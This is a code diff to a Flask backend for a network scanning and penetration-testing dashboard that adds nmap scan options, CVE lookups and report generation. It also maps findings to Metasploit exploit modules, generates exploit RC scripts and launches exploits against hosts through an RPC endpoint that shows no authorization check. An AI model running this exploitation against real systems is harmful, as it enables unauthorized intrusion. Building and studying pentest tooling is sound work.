@@ -7,7 +7,7 @@ import re
 import secrets
 import threading
 import requests # type: ignore
-from flask import Flask, render_template, request, redirect, url_for, session, jsonify, Response # type: ignore
+from flask import Flask, render_template, request, redirect, url_for, session, jsonify, Response, make_response # type: ignore
 from flask_pymongo import PyMongo # type: ignore
 from flask_cors import CORS # type: ignore
 from flask_socketio import SocketIO, emit # type: ignore
@@ -18,7 +18,7 @@ from datetime import datetime, timezone, timedelta, date
 
 # Internal Logic Modules
 from ai_logic import compute_risk_scores # type: ignore
-from config import threats, network_scans, activity_log, users, cve_cache, check_connection # type: ignore
+from config import threats, network_scans, activity_log, users, cve_cache, ip_geo_cache, scan_jobs, check_connection # type: ignore
 
 app = Flask(__name__)
 socketio = SocketIO(app, cors_allowed_origins="*")
@@ -161,7 +161,16 @@ def handle_connect(auth):
 #  Frontend
 # ═════════════════════════════════════════════════════════════════════
 
+@app.route("/")
+def serve_dashboard():
+    """Serve the NexShield Mission Control dashboard."""
+    return render_template("index.html")
 
+
+@app.route("/report")
+def serve_report():
+    """Serve the formatted HTML penetration testing report page."""
+    return render_template("report.html")
 
 
 # ═════════════════════════════════════════════════════════════════════
@@ -231,7 +240,25 @@ def get_threats():
         .sort("detected_at", -1)
         .limit(limit)
     )
-    return jsonify({"status": "complete", "threats": _serialize(docs)})
+    
+    # Enrich with weaponization metadata
+    enriched = []
+    for t in docs:
+        t_serialized = _serialize(t)
+        name = t.get("name", "").lower()
+        detail = t.get("detail", "").lower()
+        cve = t.get("cve_id", "").lower()
+        
+        module = None
+        for keyword, mod in MSF_MAPPINGS.items():
+            if keyword in name or keyword in detail or keyword in cve:
+                module = mod
+                break
+        
+        t_serialized["exploit_module"] = module
+        enriched.append(t_serialized)
+
+    return jsonify({"status": "complete", "threats": enriched})
 
 
 # ═════════════════════════════════════════════════════════════════════
@@ -425,29 +452,45 @@ def get_timeline():
 
 
 # ═════════════════════════════════════════════════════════════════════
-#  API — Scan trigger
+#  API — Scan trigger (Enhanced with scan types, nmap lock, progress)
 # ═════════════════════════════════════════════════════════════════════
+
+ALLOWED_SCAN_TYPES = {"quick", "default", "deep", "stealth", "udp", "vuln", "os", "full"}
 
 @app.route("/api/scan", methods=["POST"])
 def trigger_scan():
-    """Trigger a network scan. Accepts optional JSON body {target, ports}."""
+    """Trigger a network scan. Accepts JSON: {target, ports, scan_type}."""
     if not check_connection():
         return jsonify({"status": "error", "message": "Database is offline. Please start MongoDB."}), 503
 
-    def background_scan(tgt, prts):
+    def background_scan(tgt, prts, stype):
         try:
-            _log_activity("scan_start", f"Scan initiated on {tgt} (ports: {prts})")
-            results = run_scan(tgt, prts)
-            msg = f"Scan complete: {len(results)} host(s) found on {tgt}"
+            def on_progress(pct, msg):
+                socketio.emit("scan_progress", {"percent": pct, "message": msg, "target": tgt})
+
+            _log_activity("scan_start", f"[{stype.upper()}] Scan initiated on {tgt} (ports: {prts})")
+            results = run_scan(tgt, prts, scan_type=stype, progress_callback=on_progress)
+            msg = f"Scan complete: {len(results)} host(s) found on {tgt} [{stype}]"
             _log_activity("scan_complete", msg, "success")
-            socketio.emit("scan_complete", {"status": "success", "message": msg})
+            socketio.emit("scan_complete", {"status": "success", "message": msg, "host_count": len(results)})
+        except RuntimeError as err:
+            msg = f"Scan blocked: {str(err)}"
+            _log_activity("scan_error", msg, "error")
+            socketio.emit("scan_complete", {"status": "error", "message": msg})
         except Exception as err:
             msg = f"Scan failed: {str(err)}"
             _log_activity("scan_error", msg, "error")
             socketio.emit("scan_complete", {"status": "error", "message": msg})
 
     try:
-        from scanner import run_scan, DEFAULT_PORTS  # type: ignore
+        from scanner import run_scan, DEFAULT_PORTS, SCAN_TYPES, is_scan_running, validate_target  # type: ignore
+
+        # Check nmap lock — prevent concurrent scans
+        if is_scan_running():
+            return jsonify({
+                "status": "error",
+                "message": "A scan is already running. Wait for it to finish.",
+            }), 409
 
         body = request.get_json(silent=True) or {}
         target, ports = _validate_scan_inputs(
@@ -456,19 +499,127 @@ def trigger_scan():
             DEFAULT_PORTS,
         )
 
+        # Validate scan type
+        scan_type = (body.get("scan_type") or "default").strip().lower()
+        if scan_type not in ALLOWED_SCAN_TYPES:
+            return jsonify({"status": "error", "message": f"Invalid scan type. Use: {', '.join(sorted(ALLOWED_SCAN_TYPES))}"}), 400
+
+        # Deep target validation via scanner module
+        tv = validate_target(target)
+        if not tv["valid"]:
+            return jsonify({"status": "error", "message": tv["error"]}), 400
+
+        scan_label = SCAN_TYPES.get(scan_type, {}).get("label", scan_type)
+
         # Run scan in the background to prevent HTTP timeout
-        _start_background_task(background_scan, target, ports)
+        _start_background_task(background_scan, target, ports, scan_type)
 
         return jsonify({
             "status": "accepted",
-            "message": "Scan started in the background. Check activity logs for completion.",
+            "message": f"{scan_label} started on {target}. Check activity logs for progress.",
             "target": target,
+            "scan_type": scan_type,
+            "target_info": tv,
         }), 202
     except ValueError as exc:
         return jsonify({"status": "error", "message": str(exc)}), 400
     except Exception as e:
         _log_activity("scan_error", f"Scan failed: {str(e)}", "error")
         return jsonify({"status": "error", "message": str(e)}), 500
+
+
+@app.route("/api/scan/status", methods=["GET"])
+def scan_status():
+    """Check if a scan is currently running and its progress."""
+    try:
+        from scanner import get_scan_status  # type: ignore
+        return jsonify({"status": "complete", **get_scan_status()})
+    except Exception as e:
+        return jsonify({"status": "error", "message": str(e)}), 500
+
+
+@app.route("/api/scan/nmap-check", methods=["GET"])
+def nmap_check():
+    """Verify nmap is installed and return version/path info."""
+    try:
+        from scanner import check_nmap_installed, SCAN_TYPES  # type: ignore
+        ok, info = check_nmap_installed()
+        return jsonify({
+            "status": "complete",
+            "nmap_ok": ok,
+            "nmap_info": info,
+            "scan_types": {k: v["label"] for k, v in SCAN_TYPES.items()},
+        })
+    except Exception as e:
+        return jsonify({"status": "error", "message": str(e)}), 500
+
+
+@app.route("/api/hosts", methods=["GET"])
+def list_hosts():
+    """Return all discovered hosts with aggregated stats."""
+    if not check_connection():
+        return jsonify({"status": "error", "message": "Database unavailable"}), 503
+
+    pipeline = [
+        {"$group": {
+            "_id": "$host",
+            "hostname": {"$first": "$hostname"},
+            "scan_count": {"$sum": 1},
+            "latest_scan": {"$max": "$scanned_at"},
+            "first_seen": {"$min": "$scanned_at"},
+            "scan_types": {"$addToSet": "$scan_type"},
+            "os_name": {"$first": "$os_detection.name"},
+            "open_ports": {"$max": "$open_port_count"},
+            "services": {"$first": "$services_detected"},
+        }},
+        {"$sort": {"latest_scan": -1}},
+        {"$limit": 200},
+    ]
+
+    hosts = list(network_scans.aggregate(pipeline))
+    result = []
+    for h in hosts:
+        ip = h["_id"]
+        if not ip:
+            continue
+        # Get threat count for this host
+        threat_count = threats.count_documents({"host": ip})
+        result.append({
+            "host": ip,
+            "hostname": h.get("hostname", ""),
+            "scan_count": h.get("scan_count", 0),
+            "latest_scan": _serialize(h.get("latest_scan")),
+            "first_seen": _serialize(h.get("first_seen")),
+            "os_name": h.get("os_name", ""),
+            "open_ports": h.get("open_ports", 0),
+            "services": h.get("services", []),
+            "threat_count": threat_count,
+        })
+
+    return jsonify({"status": "complete", "hosts": result, "total": len(result)})
+
+
+@app.route("/api/host/<path:ip>/history", methods=["GET"])
+def host_scan_history(ip):
+    """Return paginated scan history for a specific host."""
+    if not check_connection():
+        return jsonify({"status": "error", "message": "Database unavailable"}), 503
+
+    ip = ip.strip()
+    limit = _normalize_limit(request.args.get("limit", 10, type=int), 10, 50)
+
+    scans = list(
+        network_scans.find({"host": ip})
+        .sort("scanned_at", -1)
+        .limit(limit)
+    )
+
+    return jsonify({
+        "status": "complete",
+        "host": ip,
+        "scan_count": len(scans),
+        "scans": _serialize(scans),
+    })
 
 
 # ═════════════════════════════════════════════════════════════════════
@@ -665,6 +816,91 @@ def cve_detail(cve_id):
         return jsonify({"status": "error", "message": str(e)}), 500
 
 
+@app.route("/api/nvd/cpe", methods=["GET"])
+def nvd_cpe_lookup():
+    """Search CVEs by CPE name (e.g., cpe:2.3:o:microsoft:windows_10:1607:*:*:*:*:*:*:*)."""
+    cpe_name = (request.args.get("cpeName") or "").strip()
+    if not cpe_name:
+        return jsonify({"status": "error", "message": "cpeName parameter is required."}), 400
+    try:
+        from cve_lookup import lookup_by_cpe  # type: ignore
+        limit = _normalize_limit(request.args.get("limit", 20, type=int), 20, 100)
+        result = lookup_by_cpe(cpe_name, limit)
+        if "error" in result:
+            return jsonify({"status": "error", "message": result["error"]}), 502
+        return jsonify({"status": "complete", **result})
+    except Exception as e:
+        return jsonify({"status": "error", "message": str(e)}), 500
+
+
+@app.route("/api/nvd/tag", methods=["GET"])
+def nvd_tag_lookup():
+    """Search CVEs by tag (e.g., disputed)."""
+    tag = (request.args.get("cveTag") or "").strip()
+    if not tag:
+        return jsonify({"status": "error", "message": "cveTag parameter is required."}), 400
+    try:
+        from cve_lookup import lookup_by_tag  # type: ignore
+        limit = _normalize_limit(request.args.get("limit", 20, type=int), 20, 100)
+        result = lookup_by_tag(tag, limit)
+        if "error" in result:
+            return jsonify({"status": "error", "message": result["error"]}), 502
+        return jsonify({"status": "complete", **result})
+    except Exception as e:
+        return jsonify({"status": "error", "message": str(e)}), 500
+
+
+@app.route("/api/nvd/cvss-v2-metrics", methods=["GET"])
+def nvd_cvss_v2_metrics_lookup():
+    """Search CVEs by CVSS v2 vector string (e.g., AV:N/AC:H/Au:N/C:C/I:C/A:C)."""
+    vector = (request.args.get("cvssV2Metrics") or "").strip()
+    if not vector:
+        return jsonify({"status": "error", "message": "cvssV2Metrics parameter is required."}), 400
+    try:
+        from cve_lookup import lookup_by_cvss_v2_metrics  # type: ignore
+        limit = _normalize_limit(request.args.get("limit", 20, type=int), 20, 100)
+        result = lookup_by_cvss_v2_metrics(vector, limit)
+        if "error" in result:
+            return jsonify({"status": "error", "message": result["error"]}), 502
+        return jsonify({"status": "complete", **result})
+    except Exception as e:
+        return jsonify({"status": "error", "message": str(e)}), 500
+
+
+@app.route("/api/nvd/cvss-v2-severity", methods=["GET"])
+def nvd_cvss_v2_severity_lookup():
+    """Search CVEs by CVSS v2 severity (LOW, MEDIUM, HIGH)."""
+    severity = (request.args.get("cvssV2Severity") or "").strip()
+    if not severity:
+        return jsonify({"status": "error", "message": "cvssV2Severity parameter is required."}), 400
+    try:
+        from cve_lookup import lookup_by_cvss_v2_severity  # type: ignore
+        limit = _normalize_limit(request.args.get("limit", 20, type=int), 20, 100)
+        result = lookup_by_cvss_v2_severity(severity, limit)
+        if "error" in result:
+            return jsonify({"status": "error", "message": result["error"]}), 502
+        return jsonify({"status": "complete", **result})
+    except Exception as e:
+        return jsonify({"status": "error", "message": str(e)}), 500
+
+
+@app.route("/api/nvd/search", methods=["GET"])
+def nvd_universal_search():
+    """Universal NVD search — auto-detects query type or accepts explicit type."""
+    query = (request.args.get("q") or "").strip()
+    query_type = (request.args.get("type") or "auto").strip()
+    if not query:
+        return jsonify({"status": "error", "message": "q (query) parameter is required."}), 400
+    try:
+        from cve_lookup import search_nvd  # type: ignore
+        limit = _normalize_limit(request.args.get("limit", 20, type=int), 20, 100)
+        result = search_nvd(query, query_type, limit)
+        if "error" in result:
+            return jsonify({"status": "error", "message": result["error"]}), 502
+        return jsonify({"status": "complete", **result})
+    except Exception as e:
+        return jsonify({"status": "error", "message": str(e)}), 500
+
 
 # ═════════════════════════════════════════════════════════════════════
 #  API — Activity Log
@@ -682,6 +918,211 @@ def get_activity():
         .limit(50)
     )
     return jsonify({"status": "complete", "events": _serialize(docs)})
+
+@app.route("/api/threats/raw", methods=["GET"])
+def get_raw_threats():
+    """
+    Returns raw, unpaginated threat data filtered by minimum severity.
+    Used by the Exploit CLI to generate Metasploit RC scripts.
+    """
+    if not check_connection():
+        return jsonify({"status": "error", "message": "Database unavailable"}), 503
+
+    min_severity = request.args.get("severity", "medium").lower()
+    
+    # Severity hierarchy
+    sev_levels = {"info": 0, "low": 1, "medium": 2, "high": 3, "critical": 4}
+    target_level = sev_levels.get(min_severity, 2)
+    
+    allowed_sevs = [sev for sev, level in sev_levels.items() if level >= target_level]
+    
+    pipeline = [
+        {"$match": {"severity": {"$in": allowed_sevs}}},
+        {"$sort": {"severity": 1, "detected_at": -1}}
+    ]
+    
+    docs = list(threats.aggregate(pipeline))
+    return jsonify({"status": "complete", "threats": _serialize(docs), "count": len(docs)})
+
+# Mapping common signatures to Metasploit modules
+# ═════════════════════════════════════════════════════════════════════
+#  Exploit Intelligence Database (v5.0)
+# ═════════════════════════════════════════════════════════════════════
+
+EXPLOIT_DATABASE = {
+    "ms17-010": {
+        "module": "exploit/windows/smb/ms17_010_eternalblue",
+        "rank": "EXCELLENT",
+        "reliability": "HIGH",
+        "check": True,
+        "desc": "Remote Ring 0 kernel overflow via SMBv1. Highly unstable if target has low RAM."
+    },
+    "ms08-067": {
+        "module": "exploit/windows/smb/ms08_067_netapi",
+        "rank": "GREAT",
+        "reliability": "HIGH",
+        "check": True,
+        "desc": "Classic NetAPI overflow. Effective against older systems (XP/2003)."
+    },
+    "bluekeep": {
+        "module": "exploit/windows/rdp/cve_2019_0708_bluekeep_rce",
+        "rank": "MANUAL",
+        "reliability": "MEDIUM",
+        "check": True,
+        "desc": "RDP Use-After-Free. Requires precise kernel grooming. High risk of BSoD."
+    },
+    "log4shell": {
+        "module": "exploit/multi/http/log4shell_header_injection",
+        "rank": "EXCELLENT",
+        "reliability": "MAXIMAL",
+        "check": True,
+        "desc": "JNDI injection via Log4j. Cross-platform. One of the most critical bugs in history."
+    },
+    "pwnkit": {
+        "module": "exploit/linux/local/cve_2021_4034_pwnkit_lpe",
+        "rank": "EXCELLENT",
+        "reliability": "HIGH",
+        "check": False,
+        "desc": "Polkit pkexec Local Privilege Escalation. Reliable and silent."
+    },
+    "vsftpd 2.3.4": {
+        "module": "exploit/unix/ftp/vsftpd_234_backdoor",
+        "rank": "EXCELLENT",
+        "reliability": "MAXIMAL",
+        "check": True,
+        "desc": "Backdoor trigger via ':)' smiley in username. Instant root access."
+    },
+    "proxylogon": {
+        "module": "exploit/windows/http/exchange_proxylogon_rce",
+        "rank": "EXCELLENT",
+        "reliability": "HIGH",
+        "check": True,
+        "desc": "Exchange Server SSRF + File Write. Leads to full domain compromise."
+    },
+    "redis": {
+        "module": "exploit/linux/redis/redis_replication_cmd_exec",
+        "rank": "EXCELLENT",
+        "reliability": "HIGH",
+        "check": True,
+        "desc": "Master/Slave replication takeover. Allows arbitrary command execution."
+    }
+}
+
+# Legacy mapping for backwards compatibility
+MSF_MAPPINGS = {k: v["module"] for k, v in EXPLOIT_DATABASE.items()}
+MSF_MAPPINGS.update({
+    "tomcat": "exploit/multi/http/tomcat_mgr_upload",
+    "smb": "auxiliary/scanner/smb/smb_version",
+    "printnightmare": "exploit/windows/dcerpc/cve_2021_34527_printnightmare",
+})
+
+@app.route("/api/exploit/generate", methods=["GET"])
+def api_generate_exploit_rc():
+    """Generate and return a Metasploit RC script for a host or all hosts."""
+    from flask import Response
+    
+    if not check_connection():
+        return jsonify({"status": "error", "message": "Database unavailable"}), 503
+
+    host = request.args.get("host")
+    preview = request.args.get("preview") == "true"
+    query = {"severity": {"$in": ["high", "critical"]}}
+    if host:
+        query["host"] = host
+        
+    docs = list(threats.find(query))
+    if not docs:
+        msg = "[-] No high/critical threats found to exploit."
+        return jsonify({"status": "error", "message": msg}) if preview else (msg, 404)
+        
+    rc_lines = [
+        "# NexShield Auto-Generated Metasploit Script",
+        f"# Targets: {host if host else 'All High/Critical Hosts'}",
+        "spool msf_nexshield_session.log",
+        "setg VERBOSE true",
+        ""
+    ]
+    
+    modules_added = set()
+    for t in docs:
+        t_host = t.get("host")
+        detail = t.get("detail", "").lower()
+        name = t.get("name", "").lower()
+        cve = t.get("cve_id", "").lower()
+        
+        module = None
+        for keyword, mod in MSF_MAPPINGS.items():
+            if keyword in detail or keyword in name or keyword in cve:
+                module = mod
+                break
+                
+        if module:
+            combo_key = f"{t_host}_{module}"
+            if combo_key not in modules_added:
+                rc_lines.extend([
+                    f"# Target: {t_host} - {t.get('name')}",
+                    f"use {module}",
+                    f"set RHOSTS {t_host}",
+                    "set LHOST eth0  # Update this if needed",
+                    "exploit -j",
+                    ""
+                ])
+                modules_added.add(combo_key)
+                
+    if not modules_added:
+        msg = "[-] Could not map any discovered threats to known Metasploit modules."
+        return jsonify({"status": "error", "message": msg}) if preview else (msg, 404)
+        
+    content = "\\n".join(rc_lines)
+    
+    if preview:
+        return jsonify({"status": "complete", "script": content})
+        
+    filename = f"exploit_{host.replace('.', '_') if host else 'all'}.rc"
+    return Response(content, mimetype="text/plain", headers={"Content-Disposition": f"attachment;filename={filename}"})
+
+
+@app.route("/api/exploit/execute", methods=["POST"])
+def api_execute_exploit():
+    """Trigger live Metasploit execution via RPC."""
+    if not check_connection():
+        return jsonify({"status": "error", "message": "Database unavailable"}), 503
+
+    data = request.get_json() or {}
+    host = data.get("host")
+    
+    if not host:
+        return jsonify({"status": "error", "message": "Host is required"}), 400
+        
+    query = {"host": host, "severity": {"$in": ["high", "critical"]}}
+    docs = list(threats.find(query))
+    
+    if not docs:
+        return jsonify({"status": "error", "message": f"No high/critical threats found for {host}."}), 404
+        
+    module_to_run = None
+    for t in docs:
+        detail = t.get("detail", "").lower()
+        name = t.get("name", "").lower()
+        cve = t.get("cve_id", "").lower()
+        
+        for keyword, mod in MSF_MAPPINGS.items():
+            if keyword in detail or keyword in name or keyword in cve:
+                module_to_run = mod
+                break
+        if module_to_run:
+            break
+            
+    if not module_to_run:
+        return jsonify({"status": "error", "message": "Could not map vulnerabilities to a Metasploit module."}), 404
+        
+    try:
+        from msf_rpc import execute_exploit  # type: ignore
+        result = execute_exploit(host, module_to_run)
+        _log_activity("exploit_launched", f"Launched {module_to_run} against {host}", "warning")
+        return jsonify(result)
+    except Exception as e:
+        return jsonify({"status": "error", "message": str(e)}), 500
 
 
 # ═════════════════════════════════════════════════════════════════════
@@ -758,6 +1199,331 @@ def get_threat_trends():
         "source_distribution": source_dist,
         "tag_frequency": tags,
     })
+
+
+# ═════════════════════════════════════════════════════════════════════
+#  API — Pentest Report Generator
+# ═════════════════════════════════════════════════════════════════════
+
+# Severity-based remediation templates for auto-generated reports
+_REMEDIATION_MAP = {
+    "SMB Exposed":            "Disable SMBv1, restrict SMB to internal VLANs, enforce SMB signing.",
+    "RDP Exposed":            "Restrict RDP to VPN-only, enable NLA, enforce MFA, use RD Gateway.",
+    "SSH Exposed":             "Disable password auth, enforce key-based auth, restrict to bastion hosts.",
+    "Telnet Exposed":         "Disable Telnet entirely, replace with SSH.",
+    "FTP Exposed":            "Replace FTP with SFTP/SCP, disable anonymous access.",
+    "Redis Exposed":          "Set requirepass, bind to 127.0.0.1, disable FLUSHALL/CONFIG.",
+    "MongoDB Exposed":        "Enable authentication, bind to localhost, use TLS.",
+    "Elasticsearch Exposed":  "Enable X-Pack security, restrict to internal network.",
+    "MySQL Exposed":          "Restrict to app-tier IPs, rotate default credentials.",
+    "PostgreSQL Exposed":     "Restrict pg_hba.conf, enforce SSL connections.",
+    "VNC Exposed":            "Disable VNC or tunnel through SSH, enforce strong passwords.",
+    "Kubernetes API Exposed": "Restrict API server to private network, enable RBAC.",
+    "Unencrypted":            "Migrate to encrypted protocol variant, enforce TLS 1.2+.",
+    "Default Credentials":    "Rotate all default passwords, enforce complexity policies.",
+    "Credential Dump Risk":   "Implement LSA protection, restrict Kerberos delegation.",
+    "Persistence Vector":     "Audit cron/scheduled tasks, monitor web directories for shells.",
+    "DLL Hijack Risk":        "Enforce code signing, audit DLL search paths, use SafeDllSearchMode.",
+}
+
+
+@app.route("/api/report", methods=["GET"])
+def generate_report():
+    """
+    Generate a structured penetration testing report from live scan data.
+    Returns JSON with: executive summary, host inventory, vulnerability findings,
+    risk scores, MITRE ATT&CK coverage, and remediation recommendations.
+    """
+    if not check_connection():
+        return jsonify({"status": "error", "message": "Database unavailable"}), 503
+
+    try:
+        from ai_logic import MODELS, MITRE_TECHNIQUES, SEVERITY_WEIGHTS  # type: ignore
+
+        # ── 1. Executive Summary ─────────────────────────────────
+        total_threats = threats.count_documents({})
+        total_scans = network_scans.count_documents({})
+        sev_counts = {
+            "critical": threats.count_documents({"severity": "critical"}),
+            "high":     threats.count_documents({"severity": "high"}),
+            "medium":   threats.count_documents({"severity": "medium"}),
+            "low":      threats.count_documents({"severity": "low"}),
+        }
+
+        unique_hosts = threats.distinct("host")
+        unique_cves = [c for c in threats.distinct("cve_id") if c and c.startswith("CVE-")]
+        engines_active = threats.distinct("source")
+
+        # Overall risk assessment
+        if sev_counts["critical"] > 5:
+            overall_risk = "CRITICAL"
+            overall_summary = "Multiple critical vulnerabilities detected. Immediate remediation required."
+        elif sev_counts["critical"] > 0 or sev_counts["high"] > 10:
+            overall_risk = "HIGH"
+            overall_summary = "Significant vulnerabilities present. Prioritize patching and access controls."
+        elif sev_counts["high"] > 0:
+            overall_risk = "MEDIUM"
+            overall_summary = "Moderate risk detected. Address high-severity findings within 2 weeks."
+        else:
+            overall_risk = "LOW"
+            overall_summary = "Minimal vulnerabilities detected. Continue regular monitoring."
+
+        executive_summary = {
+            "overall_risk": overall_risk,
+            "summary": overall_summary,
+            "total_threats": total_threats,
+            "total_hosts_scanned": total_scans,
+            "unique_hosts_affected": len(unique_hosts),
+            "severity_breakdown": sev_counts,
+            "unique_cves": len(unique_cves),
+            "engines_active": len(engines_active),
+            "generated_at": datetime.now(timezone.utc).isoformat(),
+        }
+
+        # ── 2. Target Environment ────────────────────────────────
+        host_pipeline = [
+            {"$group": {
+                "_id": "$host",
+                "hostname": {"$first": "$hostname"},
+                "state": {"$first": "$state"},
+                "os_name": {"$first": "$os_detection.name"},
+                "os_accuracy": {"$first": "$os_detection.accuracy"},
+                "os_family": {"$first": "$os_detection.family"},
+                "open_ports": {"$max": "$open_port_count"},
+                "services": {"$first": "$services_detected"},
+                "scan_types": {"$addToSet": "$scan_type"},
+                "latest_scan": {"$max": "$scanned_at"},
+                "mac_address": {"$first": "$mac_address"},
+                "mac_vendor": {"$first": "$mac_vendor"},
+            }},
+            {"$sort": {"open_ports": -1}},
+            {"$limit": 100},
+        ]
+        host_docs = list(network_scans.aggregate(host_pipeline))
+        target_environment = []
+        for h in host_docs:
+            if not h["_id"]:
+                continue
+            target_environment.append({
+                "host": h["_id"],
+                "hostname": h.get("hostname", ""),
+                "state": h.get("state", "unknown"),
+                "os": h.get("os_name", "Unknown"),
+                "os_accuracy": h.get("os_accuracy", 0),
+                "os_family": h.get("os_family", ""),
+                "open_ports": h.get("open_ports", 0),
+                "services": h.get("services", []),
+                "scan_types_used": h.get("scan_types", []),
+                "last_scanned": _serialize(h.get("latest_scan")),
+                "mac_address": h.get("mac_address", ""),
+                "mac_vendor": h.get("mac_vendor", ""),
+            })
+
+        # ── 3. Vulnerability Findings (grouped by host) ──────────
+        findings_pipeline = [
+            {"$sort": {"detected_at": -1}},
+            {"$group": {
+                "_id": "$host",
+                "threats": {"$push": {
+                    "name": "$name",
+                    "severity": "$severity",
+                    "cve_id": "$cve_id",
+                    "source": "$source",
+                    "detail": "$detail",
+                    "tags": "$tags",
+                    "detected_at": "$detected_at",
+                }},
+                "critical_count": {"$sum": {"$cond": [{"$eq": ["$severity", "critical"]}, 1, 0]}},
+                "high_count": {"$sum": {"$cond": [{"$eq": ["$severity", "high"]}, 1, 0]}},
+                "total": {"$sum": 1},
+            }},
+            {"$sort": {"critical_count": -1, "high_count": -1}},
+        ]
+        findings_raw = list(threats.aggregate(findings_pipeline))
+        vulnerability_findings = []
+        # Enriching data...
+        for f in findings_raw:
+            if not f["_id"]:
+                continue
+            
+            # Enrich threats with deep Metasploit intelligence
+            enriched_threats = []
+            for t in f["threats"]:
+                intel = None
+                d_low, n_low, c_low = t.get("detail","").lower(), t.get("name","").lower(), t.get("cve_id","").lower()
+                
+                # Check for detailed intel first
+                for keyword, info in EXPLOIT_DATABASE.items():
+                    if keyword in d_low or keyword in n_low or keyword in c_low:
+                        intel = info
+                        break
+                
+                if intel:
+                    t["exploit_module"] = intel["module"]
+                    t["exploit_rank"] = intel["rank"]
+                    t["exploit_reliability"] = intel["reliability"]
+                    t["exploit_desc"] = intel["desc"]
+                    t["exploit_check"] = intel["check"]
+                else:
+                    # Fallback to simple mapping
+                    m_path = ""
+                    for k, m in MSF_MAPPINGS.items():
+                        if k in d_low or k in n_low or k in c_low:
+                            m_path = m; break
+                    t["exploit_module"] = m_path
+                    t["exploit_rank"] = "NORMAL"
+                    t["exploit_reliability"] = "UNKNOWN"
+                    t["exploit_desc"] = "Generic mapping detected."
+                    t["exploit_check"] = False
+
+                enriched_threats.append(t)
+
+            vulnerability_findings.append({
+                "host": f["_id"],
+                "total_threats": f["total"],
+                "critical": f["critical_count"],
+                "high": f["high_count"],
+                "threats": _serialize(enriched_threats[:50]),
+            })
+
+        # ── 4. Risk Scores ───────────────────────────────────────
+        scores = compute_risk_scores(persist=False)
+        risk_scores = [
+            {
+                "host": host,
+                "score": data["score"],
+                "risk_level": data["risk_level"],
+                "threat_count": data["threat_count"],
+                "engines_flagged": data["engines_flagged"],
+                "critical_count": data.get("critical_count", 0),
+            }
+            for host, data in sorted(scores.items(), key=lambda x: -x[1]["score"])
+        ]
+
+        # ── 5. MITRE ATT&CK Coverage ─────────────────────────────
+        tag_pipeline = [
+            {"$unwind": "$tags"},
+            {"$match": {"tags": {"$regex": "^T\\d{4}"}}},
+            {"$group": {"_id": "$tags", "count": {"$sum": 1}}},
+            {"$sort": {"count": -1}},
+        ]
+        try:
+            mitre_raw = list(threats.aggregate(tag_pipeline))
+        except Exception:
+            mitre_raw = []
+
+        mitre_coverage = []
+        for m in mitre_raw:
+            technique_id = m["_id"]
+            mitre_coverage.append({
+                "technique_id": technique_id,
+                "technique_name": MITRE_TECHNIQUES.get(technique_id, "Unknown"),
+                "occurrences": m["count"],
+            })
+
+        # ── 6. Recommendations ───────────────────────────────────
+        recommendations = []
+        seen_recs = set()
+
+        # Generate recommendations from threat names
+        all_threat_names = threats.distinct("name")
+        for threat_name in all_threat_names:
+            for pattern, remediation in _REMEDIATION_MAP.items():
+                if pattern.lower() in str(threat_name).lower() and pattern not in seen_recs:
+                    # Determine priority from severity
+                    sample = threats.find_one({"name": threat_name})
+                    sev = sample.get("severity", "medium") if sample else "medium"
+                    priority = "P0 — Immediate" if sev == "critical" else "P1 — High" if sev == "high" else "P2 — Medium"
+
+                    recommendations.append({
+                        "finding": pattern,
+                        "priority": priority,
+                        "remediation": remediation,
+                        "affected_hosts": threats.count_documents({"name": {"$regex": pattern, "$options": "i"}}),
+                    })
+                    seen_recs.add(pattern)
+                    break
+
+        # Sort by priority
+        priority_order = {"P0 — Immediate": 0, "P1 — High": 1, "P2 — Medium": 2}
+        recommendations.sort(key=lambda r: priority_order.get(r["priority"], 3))
+
+        # ── 7. Scan Metadata ─────────────────────────────────────
+        latest_scan = network_scans.find_one(sort=[("scanned_at", -1)])
+        scan_metadata = {
+            "total_scan_records": total_scans,
+            "latest_scan_id": latest_scan.get("scan_id", "") if latest_scan else "",
+            "latest_scan_time": _serialize(latest_scan.get("scanned_at")) if latest_scan else None,
+            "nmap_version": latest_scan.get("nmap_version", "") if latest_scan else "",
+            "scan_types_used": list(network_scans.distinct("scan_type")),
+            "engine_registry": {k: v for k, v in MODELS.items()},
+        }
+
+        # ── Assemble Final Report ─────────────────────────────────
+        report = {
+            "status": "complete",
+            "report_title": "NexShield Penetration Testing Report",
+            "report_version": "2.0",
+            "executive_summary": executive_summary,
+            "target_environment": target_environment,
+            "vulnerability_findings": vulnerability_findings,
+            "risk_scores": risk_scores,
+            "mitre_attack_coverage": mitre_coverage,
+            "recommendations": recommendations,
+            "scan_metadata": scan_metadata,
+        }
+
+        _log_activity("report", f"Pentest report generated: {total_threats} threats, {len(unique_hosts)} hosts", "info")
+        socketio.emit("report_generated", {"status": "success", "message": f"Report generated with {total_threats} findings"})
+
+        return jsonify(report)
+
+    except Exception as e:
+        _log_activity("report_error", f"Report generation failed: {str(e)}", "error")
+        return jsonify({"status": "error", "message": f"Report generation failed: {str(e)}"}), 500
+
+
+@app.route("/api/report/download-rc", methods=["GET"])
+def download_report_rc():
+    """
+    Generate an RC script for all weaponized threats in the database.
+    """
+    if not check_connection():
+        return "Database unavailable", 503
+
+    try:
+        all_threats = list(threats.find())
+        rc_lines = ["# NexShield v5 Intelligence-to-Action RC Script", f"# Generated at: {datetime.now().isoformat()}", ""]
+        added = set()
+
+        for t in all_threats:
+            d = t.get("detail", "").lower()
+            n = t.get("name", "").lower()
+            c = t.get("cve_id", "").lower()
+            h = t.get("host")
+            
+            for keyword, mod in MSF_MAPPINGS.items():
+                if keyword in d or keyword in n or keyword in c:
+                    if (h, mod) not in added:
+                        rc_lines.append(f"# Threat: {t.get('name')}")
+                        rc_lines.append(f"use {mod}")
+                        rc_lines.append(f"set RHOSTS {h}")
+                        rc_lines.append(f"set LHOST eth0")
+                        rc_lines.append("exploit -j")
+                        rc_lines.append("")
+                        added.add((h, mod))
+                    break
+        
+        if len(rc_lines) <= 3:
+            return "No weaponized threats found.", 404
+
+        response = make_response("\n".join(rc_lines))
+        response.headers["Content-Disposition"] = "attachment; filename=nexshield_v5_operation.rc"
+        response.headers["Content-Type"] = "text/plain"
+        return response
+
+    except Exception as e:
+        return str(e), 500
 
 
 # ═════════════════════════════════════════════════════════════════════
